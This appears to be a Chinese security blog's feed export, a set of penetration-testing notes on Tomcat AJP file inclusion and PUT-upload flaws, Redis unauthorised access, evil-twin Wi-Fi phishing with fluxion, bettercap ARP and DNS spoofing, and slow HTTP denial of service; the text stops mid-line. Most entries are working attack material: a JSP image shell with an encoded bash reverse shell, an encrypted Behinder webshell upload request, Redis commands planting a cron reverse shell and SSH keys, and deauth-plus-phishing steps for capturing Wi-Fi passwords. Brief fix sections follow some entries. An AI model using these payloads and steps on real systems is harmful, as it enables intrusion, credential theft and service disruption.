      <title>Tomcat:CVE-2020-1938</title>
      <link href="/2022/06/27/Tomcat-CVE-2020-1938-AJP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/06/27/Tomcat-CVE-2020-1938-AJP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p><a href="https://vulfocus.cn/#/dashboard">https://vulfocus.cn/#/dashboard</a></p><h3 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>开启了ajp端口，如8009等</p><pre><code>Apache Tomcat 9.x &lt; 9.0.31Apache Tomcat 8.x &lt; 8.5.51Apache Tomcat 7.x &lt; 7.0.100Apache Tomcat 6.x</code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>CVE-2020-1938为Tomcat AJP文件包含漏洞，由于Tomcat AJP协议本身的缺陷，攻击者可以通过Tomcat AJP connector可以包含Webapps目录下的所有文件</p><p>使用exp进行测试<a href="https://github.com/sv3nbeast/CVE-2020-1938-Tomact-file_include-file_read">https://github.com/sv3nbeast/CVE-2020-1938-Tomact-file_include-file_read</a></p><p>读取文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 &quot;Tomcat-ROOT路径下文件读取(CVE-2020-1938).py&quot; -p 8009 -f /WEB-INF/web.xml 127.0.0.1</span><br></pre></td></tr></table></figure><p>包含文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 &quot;Tomcat-ROOT路径下文件包含(CVE-2020-1938).py&quot; -p 8009 -f /test.txt 127.0.0.1</span><br></pre></td></tr></table></figure><p>如果网站存在文件上传功能，可以先上传命令执行的图片马，然后利用第二个文件包含脚本包含图片马地址，达到执行命令的效果。</p><p>如上传如下木马为shell.jpg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xLzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;).getInputStream();</span><br><span class="line">int a = -1;</span><br><span class="line">byte[] b = new byte[2048];</span><br><span class="line">out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">while((a=in.read(b))!=-1)&#123;</span><br><span class="line">out.println(new String(b));</span><br><span class="line">&#125;</span><br><span class="line">out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>监听7777端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p>利用第二个脚本执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 &quot;Tomcat-ROOT路径下文件包含(CVE-2020-1938).py&quot; -p 8009 -f /shell.jpg 127.0.0.1</span><br></pre></td></tr></table></figure><p>该脚本利用漏洞成功包含shell.jpg文件，使其以jsp格式解析，成功反弹shell</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><pre><code>1，临时禁用AJP协议端口，在conf/server.xml配置文件中注释掉&lt;Connector port=“8009” protocol=&quot;AJP/1.3&quot;redirectPort=“8443” /&gt;2，更新tomcat版本</code></pre>]]></content>
      
      
      <categories>
          
          <category> 1.外围渗透 </category>
          
          <category> 3.已知漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat:CVE-2017-12615-PUT上传漏洞</title>
      <link href="/2022/06/27/Tomcat-CVE-2017-12615-PUT%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/06/27/Tomcat-CVE-2017-12615-PUT%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p><a href="https://vulfocus.cn/#/dashboard">https://vulfocus.cn/#/dashboard</a></p><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>Tomcat7.0.0-7.0.81</p><p>Tomecat允许put方法</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>当conf&#x2F;web.xml中的readonly设置为false时，可导致PUT方法上传任意文件。</p><p>改POST为PUT，文件名为&#x2F;shell.jsp&#x2F;，jsp后面带斜杠可以绕过tomcat默认拦截jsp文件上传的规则，数据包如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PUT /shell.jsp/ HTTP/1.1</span><br><span class="line">Host: 123.58.236.76:62569</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: Hm_lvt_deaeca6802357287fb453f342ce28dda=1650783599,1650802097,1652247719,1652272906; JSESSIONID=CF2E094DF0D9B8D77D0CFA3B123093A6</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 533</span><br><span class="line"></span><br><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;xxxxxxxxxxxxx&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure><p>上传后访问&#x2F;shell.jsp，用冰蝎连接木马getshell。</p><h3 id="注"><a href="#注" class="headerlink" title="注"></a>注</h3><p>必须当conf&#x2F;web.xml中的readonly设置为false时，才会导致该漏洞。</p><p>上传文件名为shell.jsp&#x2F;是绕过文件名后缀后名单的一种方式，还可以采取其他方式，linux中shell.jsp&#x2F;，windows中shell.jsp.|shell.jsp::$DATA|shell.jsp%20等都可以</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.配置readonly和VirtualDirContext值为True或注释参数，禁止使用PUT方法并重启<br> tomcat<br> 注意：如果禁用PUT方法，对于依赖PUT方法的应用，可能导致业务失效。<br> 2.根据官方补丁升级最新版本</p>]]></content>
      
      
      <categories>
          
          <category> 1.外围渗透 </category>
          
          <category> 3.已知漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>go语言打包</title>
      <link href="/2022/06/20/go%E8%AF%AD%E8%A8%80%E6%89%93%E5%8C%85/"/>
      <url>/2022/06/20/go%E8%AF%AD%E8%A8%80%E6%89%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<p>go get main.go&#x2F;&#x2F;没有main.go包的情况下，对源代码打包，并执行go install生成可执行文件</p><p>go install&#x2F;&#x2F;生成可执行文件</p><p>&#x2F;etc&#x2F;profile&#x2F;&#x2F;配置文件</p><p>$gopath&#x2F;bin&#x2F;&#x2F;go install后默认生成的文件</p>]]></content>
      
      
      <categories>
          
          <category> 1.编程 </category>
          
          <category> 1.go语言 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>redis未授权</title>
      <link href="/2022/06/16/redis%E6%9C%AA%E6%8E%88%E6%9D%83/"/>
      <url>/2022/06/16/redis%E6%9C%AA%E6%8E%88%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h3 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h3><p>目标开放6379端口，用redis-cli尝试连接，若未授权即可成功连接。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>redis-cli -h ip[-p 端口(不用-p就默认6379端口)]</p><p>例：redis-cli -h 127.0.0.1</p><p>windows可以去github下载</p><p><a href="https://github.com/MicrosoftArchive/redis/releases">https://github.com/MicrosoftArchive/redis/releases</a></p><p>下载里面的zip文件，解压下来里面有一个redis-cli.exe，直接复制去用就可以了</p><h5 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">info           //查看信息     </span><br><span class="line">flushall                 //删除所有数据库内容：</span><br><span class="line">flushdb                    //刷新数据库</span><br><span class="line">看所有键：KEYS *，使用select num可以查看键值数据。</span><br><span class="line">set test &quot;who am i&quot;        //设置变量</span><br><span class="line">config set dir dirpath     //设置路径等配置</span><br><span class="line">config get dir/dbfilename  //获取路径及数据配置信息</span><br><span class="line">save                       //保存</span><br><span class="line">get                        //变量，查看变量名称</span><br></pre></td></tr></table></figure><h5 id="redis写webshell"><a href="#redis写webshell" class="headerlink" title="redis写webshell"></a>redis写webshell</h5><p>条件：1，存在web目录；2，已知web绝对路径；3，存在写入权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir &quot;C:/phpstudy_pro/WWW/web&quot;</span><br><span class="line">config set dbfilename info.php</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>\r\n\r\n代表换行的意思，用redis入的文件会自带一些版本信息，如果不换行可能会导致无法执行。</p><h5 id="redis写计划任务"><a href="#redis写计划任务" class="headerlink" title="redis写计划任务"></a>redis写计划任务</h5><p>条件：1，centos操作系统；2，权限可写计划任务</p><p><strong>准备工作</strong></p><p>看一下当前目录是什么，到时候好恢复。因为redis会覆盖计划任务目录里的同名文件，所以一定要看看清楚，dbfilename的值也取复杂一点！！！！！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config get dir//这个是查看当前配置设置的dir目录，默认是再redis安装目录下的，用info也可以看到</span><br><span class="line">config get dbfilename//查看备份文件名</span><br><span class="line">save//使用这个命令就会再设置的dir目录下生成一个备份文件</span><br></pre></td></tr></table></figure><p>准备反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">公网IP服务器：</span><br><span class="line">nc -lvp 8899</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron//设置redis目录为定时计划目录</span><br><span class="line">set test137sdf5531 &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/x.x.x.x/8899 0&gt;&amp;1\n\n&quot;//设置一个key，键值为反弹shell的命令</span><br><span class="line">config set dbfilename xiaoluanzzz//设置备份文件名为xiaoluanzzz，默认是dump.rdb</span><br><span class="line">save//在/var/spool/cron目录下生成一个名为xiaoluanzzz的备份文件，里面回存放所有键名键值，包括我们反弹shell的命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -l//查看计划任务</span><br><span class="line">del test137sdf5531//清除我们插入的键</span><br></pre></td></tr></table></figure><p>如上文代码，计划任务写入内容是：每一分钟向你的服务器反弹一次shell</p><p>注：使用kali做为目标主机进行测试，需要写入计划任务到&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs目录下</p><p>注：由于ubuntu和debian会因写入计划任务时产生的乱码，而无法执行计划任务，所以只能由centos为目标写入，centos会忽略乱码内容，执行格式正确的任务计划。</p><h5 id="redis写公钥"><a href="#redis写公钥" class="headerlink" title="redis写公钥"></a>redis写公钥</h5><p>条件：1，root权限；2，开启了ssh密钥登录，存在&#x2F;etc&#x2F;.ssh文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh密钥登陆如何开启？</span><br><span class="line">修改/etc/ssh/sshd_config配置文件</span><br><span class="line">RSAAuthentication设置为yes，意思是设置开启使用RSA算法的基于rhosts的安全验证；</span><br><span class="line">PubkeyAuthentication设置为yes，意思是设置开启公钥验证；</span><br><span class="line">AuthorizedKeyFiles后面的目录，是你上传的公钥所保存的文件；</span><br><span class="line">改完后systemctl restart sshd.service</span><br></pre></td></tr></table></figure><p>kali攻击机中，使用kali自带命令生成一对密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">cd /root/.ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt//把公钥写到key.txt文件</span><br><span class="line">cat /root/.ssh/key.txt | redis-cli -h x.x.x.x -x set tide//把公钥写给redis里的变量，变量名随意</span><br><span class="line">//在 /root/.ssh 目录下生成authorized_keys文件</span><br><span class="line">redis-cli -h x.x.x.x</span><br><span class="line">config set dir /root/.ssh </span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">//写入authorized_keys文件</span><br><span class="line">keys *</span><br><span class="line">get tide</span><br><span class="line">save</span><br><span class="line">//使用本地的私钥连接ssh</span><br><span class="line">ssh -o StrictHostKeyChecking=no x.x.x.x</span><br></pre></td></tr></table></figure><p>注：目标主机必须开启了密钥登录才能利用。<br>ssh第一次连接时要加上 -o StrictHostKeyChecking&#x3D;no，不然可能一直连不上</p>]]></content>
      
      
      <categories>
          
          <category> 1.外围渗透 </category>
          
          <category> 3.已知漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>fluxion伪ap钓鱼</title>
      <link href="/2022/05/18/fluxion%E4%BC%AAap%E9%92%93%E9%B1%BC/"/>
      <url>/2022/05/18/fluxion%E4%BC%AAap%E9%92%93%E9%B1%BC/</url>
      
        <content type="html"><![CDATA[<h3 id="抓取握手包"><a href="#抓取握手包" class="headerlink" title="抓取握手包"></a>抓取握手包</h3><p>注：wlan0是我的无线网卡名</p><p>airmon-ng start wlan0&#x2F;&#x2F;监听网卡</p><p>airodump-ng wlan0mon&#x2F;&#x2F;探测周围的AP信号</p><p>airodump-ng –c [CH] –w [握手包保存路径] –bssid [BSSID] wlan0mon&#x2F;&#x2F;BSSID是要攻击热点的物理地址，CH是信道号，握手包保存路径自定义一个绝对路径，抓完能找到包的位置即可</p><p>保持抓包状态，使用mdk3等ddos手段使目标热点内用户重连。</p><p>aireplay-ng -0 2 -c [客户端MAC] -a [BSSID] wlan0mon&#x2F;&#x2F;方法1：aireplay-ng</p><p>mdk3 wlan0mon d -c 信道号[,信道号,信道号……]&#x2F;&#x2F;方法2：mdk3，信道号可以是1个或多个</p><p>当握手包抓包界面显示[WPA handshake: xx:xx:xx:xx:xx:xx]，即代表抓包成功</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220518050020705.png" alt="image-20220518050020705"></p><h3 id="配置fluxion钓鱼攻击"><a href="#配置fluxion钓鱼攻击" class="headerlink" title="配置fluxion钓鱼攻击"></a>配置fluxion钓鱼攻击</h3><p>.&#x2F;fluxion -i&#x2F;&#x2F;打开fluxion</p><p>语言选择17中文</p><p>[1]专属门户创建一个“邪恶的双胞胎”接入点</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220518050517842.png" alt="image-20220518050517842"></p><p>[3]扫描所有信道（2.4GHz&amp;5GHz）注：观察扫描列表，扫描到了你想测试的热点就可以结束了</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220518050551771.png" alt="image-20220518050551771"></p><p>[n]选择你要测试热点的编号</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220518050630755.png" alt="image-20220518050630755"></p><p>[1]选择无线接口，我是wlan0mon</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220518050708615.png" alt="image-20220518050708615"></p><p>[2]选择热点接口，还是wlan0mon</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220518050808535.png" alt="image-20220518050808535"></p><p>[1]选ddos方案，选mdk4</p><p>[1]选接入点，选hostapd（推荐）</p><p>[1]选密码验证方式，选hash-cowpatty</p><p>输入前文中抓到的握手包的存放路径</p><p>[2]选hash的验证方式，选cowpatty验证（推荐用这个）注：这里出现hash验证成功代表没问题，否则证明握手包错了，重新抓一次握手包</p><p>[1]创建SSL证书</p><p>[1]断开原网络[推荐]</p><p>[n]选择一个合适的钓鱼热点认证页面，越有欺骗性越好</p><p>配置完成，之后观察热点列表，应该会有一个和攻击目标同名的无密码热点出现，而且此时原热点应该在被持续ddos无法正常访问，用户登入原热点无法访问，一般就会去搜索热点列表，看到我们同名的热点，可能就会连接，钓鱼热点会向用户跳出一个钓鱼认证页面，要求用户输入密码，用户输入密码后会与我们抓到的握手包进行hash对比，如果密码正确，就会将密码显示给我们，然后结束钓鱼热点。至此就算攻击完成了。</p><h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><p>应对伪AP合格的防御方式，应当是我们架设好伪AP后，尝试连接同名伪AP，会一直被强制断开，无法连接，这样就算安全，如果可以正常接入伪AP并访问钓鱼认证页面，就是有风险。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bettercap嗅探与arp污染</title>
      <link href="/2022/05/17/bettercap%E5%97%85%E6%8E%A2%E4%B8%8Earp%E6%B1%A1%E6%9F%93/"/>
      <url>/2022/05/17/bettercap%E5%97%85%E6%8E%A2%E4%B8%8Earp%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>help查看当前开启的模块</p><p>get *查看当前所有配置</p><p>get net.sniff.*查看net.sniff模块的所有配置</p><p>set net.sniff.output [属性值]设置模块的属性</p><p>help net.sniff查看模块的帮助文档</p><p>net.sniff on开启某模块</p><p>net.sniff off关闭某模块</p><p>net.recon模块：用于发现网内主机，基本信息有IP地址、MAC地址等</p><p>​net.show：net.recon模块的一个功能，列出当前发现的所有主机信息</p><h3 id="网络嗅探"><a href="#网络嗅探" class="headerlink" title="网络嗅探"></a>网络嗅探</h3><p>set net.sniff.output ceshi.pcap设置导出包</p><p>set net.sniff.regexp baidu.com设置关键字</p><p>net.sniff on开启网络嗅探，此时用户访问百度我们就可以收到http包</p><p>net.sniff off关闭网络嗅探</p><h3 id="arp污染"><a href="#arp污染" class="headerlink" title="arp污染"></a>arp污染</h3><p>arp.spoof on开启arp污染</p><p>arp.ban劫持arp流量但不放包，使全局断网</p><p>set arp.spoof.targets 192.168.1.1只针对特定IP进行arp污染</p><h3 id="http代理"><a href="#http代理" class="headerlink" title="http代理"></a>http代理</h3><h3 id="https代理"><a href="#https代理" class="headerlink" title="https代理"></a>https代理</h3><h3 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h3><p>set dns.spoof.domains <a href="http://www.sina.com/">www.sina.com</a>设置要欺骗的域名</p><p>set dns.spoof.address 127.0.0.1设置将欺骗域名解析到我们自己的恶意IP</p><p>dns.spoof on开启dns欺骗</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>慢速http拒绝服务攻击</title>
      <link href="/2022/05/11/%E6%85%A2%E9%80%9Fhttp%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/"/>
      <url>/2022/05/11/%E6%85%A2%E9%80%9Fhttp%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>使用slowhttptest工具进行测试，下载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shekyan/slowhttptest</span><br><span class="line">or</span><br><span class="line">docker pull shekyan/slowhttptest:latest</span><br></pre></td></tr></table></figure><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>slowloris模式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u https://host.example.com/index.html -x 24 -p 3</span><br></pre></td></tr></table></figure><p>slow post模式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 3000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://host.example.com/loginform.html -x 10 -p 3</span><br></pre></td></tr></table></figure><p>slow read模式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u https://host.example.com/resources/index.html -p 3</span><br></pre></td></tr></table></figure><p>参数解析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-H slow headers 攻击，缓慢发送\r\n，让服务器一直等待</span><br><span class="line"></span><br><span class="line">-B slow Body 攻击</span><br><span class="line"></span><br><span class="line">-R 范围攻击Apache killer</span><br><span class="line"></span><br><span class="line">-X slow read 攻击，读的慢，让服务器发送缓存堵塞</span><br></pre></td></tr></table></figure><p>报告生成选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-g 生成socket状态变化统计</span><br><span class="line"></span><br><span class="line">-o file_prefix将输出保存到file.html和file.csv中</span><br><span class="line"></span><br><span class="line">-v level日志等级，0-4：Fatal，Info，Error，Warning，Debug</span><br></pre></td></tr></table></figure><p>普通选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-c connections目标连接数（50）</span><br><span class="line"></span><br><span class="line">-i seconds数据发送间隔（10）</span><br><span class="line"></span><br><span class="line">-l seconds测试一个目标的时间长度（240）</span><br><span class="line"></span><br><span class="line">-r rate每秒多少个连接（50）</span><br><span class="line"></span><br><span class="line">-s bytesContent-Length的值（4096）</span><br><span class="line"></span><br><span class="line">-t verb请求中使用的动词，如果是slow header攻击，默认是GET；如果是slow body攻击，默认是POST</span><br><span class="line"></span><br><span class="line">-u URL目标URL（http://localhost/）</span><br><span class="line"></span><br><span class="line">-x bytes每一个tick随机生成的键值对最大长度，例如，-x 2 生成x-xx：xx是头字段，或是类似&amp;xx=xx的消息体，x是随机字符（32）</span><br></pre></td></tr></table></figure><p>探针&#x2F;代理选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-d host:port所有数据走指定代理host:port</span><br><span class="line"></span><br><span class="line">-e host:port 探针流量走指定代理host:port</span><br><span class="line"></span><br><span class="line">-p seconds探针超时时长，服务器被认为是网络不可达（5）</span><br></pre></td></tr></table></figure><p>范围攻击具体选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-a start左边界值（5）</span><br><span class="line"></span><br><span class="line">-b bytes右边界值（2000）</span><br></pre></td></tr></table></figure><p>slow read攻击具体选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-k num同一请求重复次数，当服务器支持持久化连接时用于放大响应长度（1）</span><br><span class="line"></span><br><span class="line">-n seconds每次从接收缓冲区中读取消息的时间间隔（1）</span><br><span class="line"></span><br><span class="line">-w bytes从通知窗中获取数据的起始位置（1）</span><br><span class="line"></span><br><span class="line">-y bytes 从通知窗中获取数据的结束位置（512）</span><br><span class="line"></span><br><span class="line">-z bytes每次从接收缓冲区中读取的长度（5）</span><br></pre></td></tr></table></figure><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>1.SpringBoot</p><p>springboot 配置文件中添加如下配置：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.connection-timeout</span>=<span class="string">20000</span></span><br></pre></td></tr></table></figure><p>2.Tomact</p><p>tomcat 配置文件 server.xml 中修改 Connector 中的 connectiontimeout 的值：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8080&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;HTTP/1.1&quot;</span> <span class="attr">connectionTimeout</span>=<span class="string">&quot;20000&quot;</span> <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>3.Nginx</p><p>nginx 上可以增加如下配置来解决此问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 指定客户端与服务端建立连接后发送 request body 的超时时间，配置段：http，server，location</span><br><span class="line">client_body_timeout 20s;</span><br><span class="line"></span><br><span class="line"># 指定客户端向服务端发送一个完整的 request header 的超时时间，配置段：http，server，location</span><br><span class="line">client_header_timeout 10s;</span><br><span class="line"></span><br><span class="line"># 服务端向客户端传输数据的超时时间，配置段：http，server，location</span><br><span class="line">send_timeout 30s;</span><br></pre></td></tr></table></figure><p>4.slow read防御方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">调整最大打开文件数为65535</span><br><span class="line">1、切换到root用户</span><br><span class="line">2、在/etc/rc.local 最后增加一行 ulimit -SHn 65535 （如若没有这个目录，直接vi /etc/rc.local后添加ulimit -SHn 65535）</span><br><span class="line">3、在/etc/profile 最后增加一行 ulimit 